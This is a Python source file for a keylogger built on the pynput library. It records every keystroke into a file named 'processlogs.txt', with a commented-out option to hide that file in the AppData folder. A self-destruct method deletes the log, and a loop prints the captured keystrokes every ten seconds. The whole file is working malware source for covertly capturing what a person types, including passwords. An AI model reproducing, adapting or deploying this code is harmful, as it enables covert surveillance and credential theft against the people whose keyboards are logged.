from pynput.keyboard import Listener
import os
import threading
import time

class Keylogger():

    # path = os.environ['appdata'] + '\\processlogs.txt'
    path = 'processlogs.txt'

    keystrokes = []
    flag = 0
    count = 0

    def on_press(self, keys):

        self.keystrokes.append(keys)
        self.count += 1

        if self.count >= 1:
            self.write_file(self.keystrokes)
            self.count = 0
            self.keystrokes = []

    def read_log(self):
        with open(self.path, 'rt') as f:
            return f.read()

    def write_file(self, key):
        with open(self.path, 'a') as file:
            for keys in key:
                k = str(keys).replace("'", "")
                if k.find("backspace") > 0:
                    file.write(" Backspace ")
                elif k.find("shift") > 0:
                    file.write(" Shift ")
                elif k.find("enter") > 0:
                    file.write("\n")
                elif k.find("space") > 0:
                    file.write(" ")
                elif k.find("caps_lock") > 0:
                    file.write(" caps_lock ")
                elif k.find("tab") > 0:
                    file.write(" tab ")
                elif k.find("Keys"):
                    file.write(k)

    def self_destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == '__main__':
    keylog = Keylogger()
    t = threading.Thread(target=keylog.start)
    t.start()
    while keylog.flag != 1:
        time.sleep(10)
        logs = keylog.read_log()
        print(logs)
        # keylog.self_destruct()
    t.join()

